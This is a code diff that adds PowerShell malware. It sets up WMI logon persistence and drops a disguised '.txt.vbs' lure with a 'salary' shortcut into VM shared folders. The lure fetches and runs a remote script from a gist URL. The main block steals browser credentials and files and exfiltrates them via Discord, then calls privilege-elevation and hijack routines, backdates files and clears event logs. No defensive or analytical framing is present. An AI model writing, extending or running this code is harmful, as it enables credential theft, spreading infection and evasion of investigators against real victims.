+    try {
+        if ($DebugMode) { Write-Host "[*] Attempting WMI Event Subscription" -ForegroundColor Cyan }
+        
+        $filterName = "WinlogonCheck_" + (Get-Random -Minimum 1000 -Maximum 9999)
+        $consumerName = "SysHelper_" + (Get-Random -Minimum 1000 -Maximum 9999)
+        
+        $query = @"
+        SELECT * FROM __InstanceCreationEvent WITHIN 30 
+        WHERE TargetInstance ISA 'Win32_LogonSession' 
+        AND TargetInstance.LogonType = 2
+"@
+        $eventFilter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
+            Name = $filterName
+            EventNamespace = 'root\cimv2'
+            QueryLanguage = 'WQL'
+            Query = $query
+        }
+
+        $eventConsumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
+            Name = $consumerName
+            CommandLineTemplate = "powershell -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+            RunInteractively = $false
+        }
+
+        $filterConsumerBinding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
+            Filter = $eventFilter
+            Consumer = $eventConsumer
+        }
+
+        if (Test-AdminRights) { return $true }
+    }
+    catch { 
+        if ($DebugMode) { Write-Host "[!] WMI Method Failed: $_" -ForegroundColor Red } 
+    }
+
+    return $false
+}
+
+# Función helper requerida
+
+function Invoke-VMSharedFolderAttack {
+# Common VM shared folder paths
+$targetPaths = @(
+"\\vmware-host\Shared Folders", # VMware
+"C:\Users\$env:USERNAME\Desktop\Shared", # VirtualBox default
+"X:\", "Y:\", "Z:\", # Common shared drive letters
+"$env:USERPROFILE\Desktop\Shared" # Fallback
+)
+
+# Generate fake "important document" filename
+$fileName = "WindowsUpdateSys.txt.vbs"
+$fileContent = @"
+MsgBox "Document preview not available. Enable macros to view content.", vbCritical, "Error"
+CreateObject("WScript.Shell").Run "powershell -WindowStyle Hidden -Command `"Invoke-WebRequest -Url https://gist.githubusercontent.com/Midaslore/9debed70bc1270a2b84ac67162d68509/raw/dda586caf8db90111c5b448db7cd67d08631a609/Gangway.ps1 -OutFile $env:TEMP\Gangway.ps1; Start-Process $env:TEMP\Gangway.ps1`""
+"@
+
+foreach ($path in $targetPaths) {
+if (Test-Path $path) {
+try {
+$fullPath = Join-Path $path $fileName
+
+# Create decoy file with double extension
+Set-Content -Path $fullPath -Value $fileContent -Force
+
+# Create shortcut to trigger execution
+$shortcutPath = Join-Path $path "CLICK_ME_TO_VIEW_SALARY.lnk"
+$WScriptShell = New-Object -ComObject WScript.Shell
+$shortcut = $WScriptShell.CreateShortcut($shortcutPath)
+$shortcut.TargetPath = "wscript.exe"
+$shortcut.Arguments = "`"$fullPath`""
+$shortcut.IconLocation = "shell32.dll,21" # Document icon
+$shortcut.Save()
+
+# Timestamp manipulation (make files appear old)
+(Get-Item $fullPath).CreationTime = "01/01/2023 08:00:00"
+(Get-Item $shortcutPath).CreationTime = "01/01/2023 08:00:00"
+
+return "Payload dropped to shared folder: $path"
+}
+catch {
+Write-Error "Failed to write to $path"
+}
+}
+}
+return "No shared folders found"
+}
+
+# Detection bypass: Only execute if in VM and during working hours
+if ((Test-Hypervisor) -and (8 -le (Get-Date).Hour -and (Get-Date).Hour -le 18)) {
+Invoke-VMSharedFolderAttack | Out-File "$env:TEMP\vm_escape.log" -Append
+}
+
+# --- MAIN ---
+Test-SafeEnvironment
+
+# Collect data
+$creds = Get-BrowserCredentials -ErrorAction SilentlyContinue
+$creds | Out-File "$env:TEMP\creds.log" -Encoding UTF8
+$files = Find-InterestingFiles
+
+# Create report
+$report = @"
+=== COMPROMISED SYSTEM ===
+User: $env:USERNAME
+Host: $env:COMPUTERNAME
+Domain: $env:USERDOMAIN
+
+=== CREDENTIALS ===
+$creds
+
+=== FILES FOUND ===
+$($files.FullName -join "`n")
+"@
+
+$reportPath = "$env:TEMP\system_report_$(Get-Date -Format 'yyyyMMdd').txt"
+$report | Out-File $reportPath
+
+# Exfiltrate
+if (Send-DiscordMessage -Message "New infection: $env:COMPUTERNAME" -FilePath $reportPath) {
+    foreach ($file in $files) {
+        Send-DiscordMessage -Message "Collected file: $($file.Name)" -FilePath $file.FullName
+    }
+}
+
+
+Test-SafeElevation
+Invoke-StealthElevation -Method COM
+Protect-ProcessMemory
+Install-Persistence -Mode "Stealth"
+Add-WmiPersistence
+Add-UserInitHijack
+Add-IFEOHijack
+Add-ComHijackPersistence
+Add-ExplorerShellExtension
+Invoke-VMSharedFolderAttack
+Clear-EventLogs
+Remove-Item $reportPath -Force
